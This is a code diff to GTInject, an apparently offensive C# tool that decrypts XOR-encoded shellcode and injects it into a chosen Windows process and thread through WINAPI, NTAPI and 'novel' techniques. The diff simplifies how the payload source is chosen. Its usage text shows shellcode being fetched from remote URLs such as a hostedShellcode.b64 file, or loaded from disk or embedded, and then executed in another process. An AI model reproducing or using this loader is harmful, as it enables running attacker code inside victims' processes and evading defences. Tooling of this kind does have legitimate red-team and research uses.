@@ -8,12 +8,6 @@ namespace GTInject
 {
     internal class Inject
     {
-        public enum sourceLocation
-        {
-            embedded,
-            url,
-            disk
-        }
         public enum execCommands
         {
             threads,
@@ -38,9 +32,9 @@ namespace GTInject
 Usage: GTInject.exe <module> <moduleArgs>
        GTInject.exe threads
        GTInject.exe encrypt pathToSource.bin MySecretXorKey
-       GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
+       GTInject.exe inject memoryOption execOption xorkey binSourcePath PID TID
 
-       GTInject.exe inject 100 100 SecretKey123 disk ""C:\path\to\xordShellcode.file\"" 1234 321
+       GTInject.exe inject 100 100 SecretKey123 ""C:\path\to\xordShellcode.file\"" 1234 321
 
 Modules: 
     Encrypt
@@ -72,16 +66,16 @@ Threads:
         Default will list all threads in an alertable state for all processes. Filters out low integrity processes to avoid isolated AppContainer threads.
 
 Inject:
-        -- GTInject.exe inject 100 102 MySecretXorKey disk 'C:\path\to\shellcode.bin' 10243 --
+        -- GTInject.exe inject 100 102 MySecretXorKey 'C:\path\to\shellcode.bin' 10243 --
         Choose a technique for allocating the memory 
         Then choose a technique for executing the thread
         Enter the XorKey to decrypt it with
-        Specify a location type where the encrypted shellcode is stored 
-            - embedded 0
-            - url https://example.globetech.biz/hostedShellcode.b64
-            - disk 'C:\path\to\xord-shellcode.bin'
+        Specify a location type where the encrypted shellcode is stored. It understands https, or local disk paths. Or you can use the string 'embedded' to use the embedded shellcode.
+            - https://example.globetech.biz/hostedShellcode.b64
+            - 'C:\path\to\xord-shellcode.bin'
+            - embedded ( will use the shellcode embedded into the tool)
         Specify the PID
-        Optionally specify the Thread Id after the Process ID -- gtinject.exe 100 101 MySecretXorKey embedded 0 10452 1337
+        Optionally specify the Thread Id after the Process ID -- gtinject.exe 100 101 MySecretXorKey https://example.com/payload.b64 10452 1337
 
 100 Series - WINAPI
 200 Series - NTAPI 
@@ -216,7 +210,6 @@ ThreadExec Options
                 int memOption = 0;
                 int execOption = 0;
                 string xorkey = "0x00";
-                string binSrcType = "";
                 string binSrcPath = "";
                 int Pid = 0;
                 int Tid = 0;
@@ -226,14 +219,12 @@ ThreadExec Options
                     memOption = int.Parse(args[1]); //Int.TryParse(args[1]);
                     execOption = int.Parse(args[2]);
                     xorkey = args[3];
-                    binSrcType = Enum.Parse(typeof(sourceLocation), args[4]).ToString();
-                    // Enum.Parse(typeof(sourceLocation), binSrcType);
-                    binSrcPath = args[5];
-                    Console.WriteLine("     Shellcode will be called from {0} located at {1}", binSrcType, binSrcPath);
-                    Pid = int.Parse(args[6]);
+                    binSrcPath = args[4];
+                    Console.WriteLine("     Shellcode will be called from:  {1}", binSrcPath);
+                    Pid = int.Parse(args[5]);
                     try
                     {
-                        Tid = int.Parse(args[7]);
+                        Tid = int.Parse(args[6]);
                     }
                     catch (IndexOutOfRangeException)
                     {
@@ -257,7 +248,7 @@ ThreadExec Options
                     Console.WriteLine("     Novel injection method selected");
                     if (memOption >= 400 && memOption <= 499)
                     {
-                        (memoryResponse, pidResp) = Novel.Novel.SelectNovelMemOption(memOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
+                        (memoryResponse, pidResp) = Novel.Novel.SelectNovelMemOption(memOption, xorkey, binSrcPath, Pid, Tid);
                         if (memoryResponse != IntPtr.Zero || pidResp != null)
                         {
                             // Non null responses from the Novel Mem Options, indicates that it will honor traditional Thread Execution options
@@ -271,12 +262,12 @@ ThreadExec Options
                     if (execOption >= 400 && execOption <= 499)
                     {
                         // A.T.M. novel thread executions don't honor any mem exec options, so we don't care... yet. 
-                        Novel.Novel.SelectNovelExecOption(execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
+                        Novel.Novel.SelectNovelExecOption(execOption, xorkey, binSrcPath, Pid, Tid);
 
                     }
                     return;
                 }
-                (memoryResponse, pidResp) = Memory.SelectMemOption(memOption, execOption, xorkey, binSrcType, binSrcPath, Pid, Tid);
+                (memoryResponse, pidResp) = Memory.SelectMemOption(memOption, execOption, xorkey, binSrcPath, Pid, Tid);
                 if (memoryResponse == IntPtr.Zero) { Console.WriteLine("[-] Failed to allocate memory, received and IntPtr 0 instead of a memory address"); }
                 else
                 {
